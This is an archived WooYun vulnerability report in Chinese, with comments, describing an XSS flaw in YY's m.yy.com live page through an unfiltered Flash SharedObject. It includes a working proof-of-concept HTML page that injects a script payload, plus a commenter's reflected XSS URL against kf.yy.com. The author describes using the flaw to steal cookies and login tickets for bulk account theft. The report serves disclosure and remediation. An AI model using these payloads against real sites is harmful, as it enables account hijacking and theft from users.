{"id": 1774, "wybug_id": "wooyun-2014-068223", "wybug_title": "YY网站的一个xss跨站漏洞（盗号必备）", "wybug_corp": "广州多玩", "wybug_author": "菜猿子", "wybug_date": "2014-07-13 13:55", "wybug_open_date": "2014-08-27 13:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向公众公开  简要描述： YY网站的xss跨站漏洞一枚，可偷摸的盗号 详细说明：  首先感谢 gainover 大神，写的教程很到位。此漏洞完全参考其教程。话不多说，详细内容请往下看。暂停一下，上次多玩说好的礼物至今杳无音讯。找个漏洞容易嘛，快把你们网站都翻烂了！接着看：这个漏洞是由一个flash文件引起的，文件地址：http://m.yy.com/live/swf/Shareobject.swf?v=1.1示例网页：http://m.yy.com/live/1980062727/   漏洞证明：  flash文件：http://m.yy.com/live/swf/Shareobject.swf?v=1.1看一下as代码，使用了SharedObject和addCallback，但是却没有对参数进行任何过滤，于是乎xss就出现了。\nprivate function fl_get(param1:uint = 9999) : Object        {            var _loc_2:* = SharedObject.getLocal(\"yy-sharedobject\", \"/\");            if (!_loc_2.data.shareObj)            {                _loc_2.data.shareObj = {};            }            if (!_loc_2.data.shareObj[param1])            {                return null;            }            return _loc_2.data.shareObj[param1];        }// end function\n出现问题的网址是娱乐的视频直播页面，示例：\nhttp://m.yy.com/live/1980062727/\n观察js文件，发现如下代码：\nfunction saveViewHisoryToCache() {\tvar b = \"ent_view_history\";\tvar a = getShareobjData(b);\tif (!a || a.length == 0) {\t\ta = [window.liveRoomTopId]\t} else {\t\tvar c = $.inArray(window.liveRoomTopId, a);\t\tif (c >= 0) {\t\t\ta.splice(c, 1)\t\t}\t\ta.push(window.liveRoomTopId);\t\tif (a.length > 18) {\t\t\ta.shift()\t\t}\t}\tsaveShareobjData(b, a)}\n进入页面后会自动读取flash SharedObject的“ent_view_history”项，于是随便建个网页，写上代码\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><script type=\"text/javascript\" src=\"swfobject.js\"></script></head><body><div id=\"main\"></div><script type=\"text/javascript\">//flashvar params = {};params.menu = \"false\";params.scale = \"noScale\";params.allowFullscreen = \"false\";params.allowScriptAccess = \"always\";params.bgcolor = \"#ffffff\";params.wmode = \"window\"; swfobject.embedSWF(\"http://m.yy.com/live/swf/Shareobject.swf?v=1.1\", \"main\", \"600\", \"600\", \"10.0.0\", \"expressInstall.swf\", null, params, null);function sharedObjectReady(){\tmain.j2s_save('1\\\\\";alert(document.domain);//1',\"ent_view_history\")}</script></body></html>\n然后访问以下这个页面，再打开上面那个http://m.yy.com/live/1980062727/，弹出了下图：\n\n执行成功！下面闲聊几句：这里有个问题，就是只能使用一次，网站会自动重置存储的内容。不过，很明显这个不是问题的所在，因为一次就够了。通过代码可以直接获取网站的cookie，然后，更重要的是，还可以通过js代码获取到当前电脑上所有已登录YY一键登录网页所需的ticket，不过这个ticket是否有IP验证我没有测试。可能你们会说，cookie、ticket是有时效性的，但是在这个有效时间内批量登录、批量盗个Y币开个会员刷个礼物啥的，还是小意思吧。可能你们还会说，可执行性差，但是相信我，让YY上的人去访问一个网页真的很简单，小白太多了，更何况这个是防不胜防，因为发的网址表面上看一点问题都没有。借用教程里的词汇叫“埋雷式攻击”！   修复方案：  参考这个吧，http://drops.wooyun.org/papers/1426当然，你们更懂，过滤下吧。   版权声明：转载请注明来源 菜猿子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-15 18:02 厂商回复： 感谢对于欢聚时代安全工作的支持，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-13 14:04 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  http://kf.yy.com/search/#=%22%3e%3cscript%3ealert(1)//    \n     2014-07-13 15:08 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  @超威蓝猫 就你这个啊？    \n     2014-07-13 15:45 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  @超威蓝猫 人艰不拆！    \n     2014-07-13 16:31 |    \t\t菜猿子 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 一个还没入门的菜鸟程序猿)\t\t \n  @超威蓝猫 比这个好玩一点。    \n     2014-07-13 16:32 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  YY现在重视新产品，其他的一般没什么事~~@佩佩 你说是吧~    \n     2014-07-13 16:38 |    \t\t菜猿子 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 一个还没入门的菜鸟程序猿)\t\t \n  @小怿 @佩佩 确切的说，YY现在重视赚(keng)钱...能保证用户的钱不丢就行了。    \n     2014-07-15 11:48 |    \t\tcorse \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 学习账号，没事别乱评论)\t\t \n  @超威蓝猫 屌    \n     2014-07-15 18:09 |    \t\tThe soul \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  怎么看看限制了字符的    \n     2014-07-15 18:30 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @超威蓝猫 被修了吧，哈~    \n     2014-07-31 01:57 |    \t\t佩佩 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 一个热衷于网络安全的白帽子,具有很强的逻...)\t\t \n  @菜猿子 缺yb!!缺yb  来点xss!!    \n     2014-08-03 11:58 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @佩佩 缺yb!!缺yb 来点xss!!     \n     2014-08-06 15:18 |    \t\t菜猿子 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 一个还没入门的菜鸟程序猿)\t\t \n  @佩佩 YY的漏洞也就自己玩玩罢了，何必上报给人家添乱呢。人家现在是上市公司，很diao的，不是以前的小作坊了。    \n     2014-08-06 16:06 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @菜猿子 纳斯达克上市的小作坊？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}